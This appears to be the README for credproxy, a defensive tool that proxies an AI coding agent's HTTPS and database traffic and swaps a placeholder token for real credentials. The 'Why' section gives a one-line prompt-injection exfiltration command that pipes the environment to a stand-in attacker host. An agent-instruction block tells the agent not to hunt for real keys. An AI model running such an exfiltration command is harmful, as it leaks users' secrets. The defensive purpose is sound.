# credproxy

credproxy runs between your AI coding agent and the internet. The agent never sees a real API key — it uses one placeholder, `CREDPROXY_TOKEN`, everywhere, and credproxy swaps in the real credential based on which host the request is going to.

## Why

AI coding agents (Claude Code, OpenCode, Cursor, etc.) make HTTP calls to APIs that need credentials — Stripe, GitHub, Unsplash, whatever. If a real key sits in the agent's env vars, config files, or instructions, prompt injection can exfiltrate it: `env | curl attacker.com` and everything's gone.

With credproxy, the only thing the agent can exfiltrate is `CREDPROXY_TOKEN`. The sentinel is worthless without the proxy; the proxy only runs as long as your session does.

## Install

Requires Go 1.21+ and the `op` CLI (1Password) for credential storage.

```bash
go install github.com/technopoetic/credproxy/cmd/credproxy@latest
```

On first run, credproxy generates a self-signed CA at `~/.config/credproxy/ca.pem`. Trust it once:

```bash
# macOS
sudo security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain ~/.config/credproxy/ca.pem

# Linux (Ubuntu/Debian)
sudo cp ~/.config/credproxy/ca.pem /usr/local/share/ca-certificates/credproxy.crt
sudo update-ca-certificates
```

## Setup

1. Map hosts to credentials in `~/.config/credproxy/config.toml`:

   ```toml
   [hosts."api.github.com"]
   credential = "op://Personal/github-pat/token"
   ```

   The host key is the exact hostname from the URL — no scheme, no port, no path.

2. Wrap your agent:

   ```bash
   cd ~/code/myproject && credproxy opencode
   ```

3. The agent uses `CREDPROXY_TOKEN` wherever a key is expected — header, query string, or request body. credproxy intercepts the outbound request, substitutes the real credential for that host, and forwards it on.

The final step is telling the agent the rule. Add this block to your `AGENTS.md` or project instructions:

---

**credproxy — Credential Injection**

A local MITM proxy intercepts your outbound HTTPS traffic and injects real API credentials automatically. **You never handle real credentials.**

**The rule:** Use the literal string `CREDPROXY_TOKEN` wherever an API key, token, or secret goes — header, query string, or request body. The proxy replaces it with the real value before the request reaches the server.

`$CREDPROXY_TOKEN` in the environment expands to `CREDPROXY_TOKEN`, so both forms are equivalent:

```bash
# Authorization header
curl -H "Authorization: Bearer CREDPROXY_TOKEN" https://api.github.com/user

# Query string
curl "https://api.unsplash.com/search/photos?query=dogs&client_id=CREDPROXY_TOKEN"

# Request body
curl -X POST https://api.stripe.com/v1/charges -d "api_key=CREDPROXY_TOKEN"
```

**Do not** look up credentials via `op`, environment variables, config files, or any other source. `CREDPROXY_TOKEN` is the only credential you should ever use.

If an API call returns 401/403, the target host is probably not configured in credproxy — report that rather than hunting for a real credential.

---

## What works

Any auth scheme where the credential is a **static value** in the request: bearer tokens, API keys in headers or query strings, Basic auth (credproxy decodes, substitutes, re-encodes).

Auth that **doesn't** work: anything that signs the request or runs a challenge-response handshake — AWS SigV4, Digest auth, NTLM/Kerberos, mTLS. The worked examples and full table are in [ADVANCED.md](ADVANCED.md).

## Databases too

HTTP isn't the only leak. credproxy also keeps database passwords out of the agent: for each database you configure, it starts a local relay that hands the child a localhost-only connection string with a random, session-scoped password. The relay opens the real connection upstream with the credential from 1Password. The real password exists only in credproxy's memory — never in the child's env, never on disk — and dies with the session. Postgres and MySQL are supported; config is in [ADVANCED.md](ADVANCED.md#database-credential-isolation).

## What credproxy doesn't do

- **It's not a sandbox.** The agent can still read files, run commands, and reach the network. credproxy is credential isolation, not execution isolation — the two are complementary.
- **It doesn't prevent misuse, only theft.** A compromised agent can still make authenticated API calls to your configured hosts. Use least-privilege credentials (read-only tokens, restricted keys) to limit the blast radius.
- **Don't point your LLM provider at a configured host.** If your agent's LLM API and a credentialed host are the same hostname, credproxy substitutes the sentinel in the request body — including your agent instructions — and the real key lands in the agent's context. Use a different LLM provider for that session.
- **Don't put real secrets in `[env]`.** credproxy can resolve `op://` URIs into env vars at startup, but then the real credential lives in the child process's environment. That's there for tools that genuinely need it — not the default path. Database credentials in particular should go through the built-in relays instead (see [ADVANCED.md](ADVANCED.md)).

## More

Advanced configuration — profiles, env var injection, per-project config, database credential isolation — plus the internals (MITM flow, resolver, security model): [ADVANCED.md](ADVANCED.md).
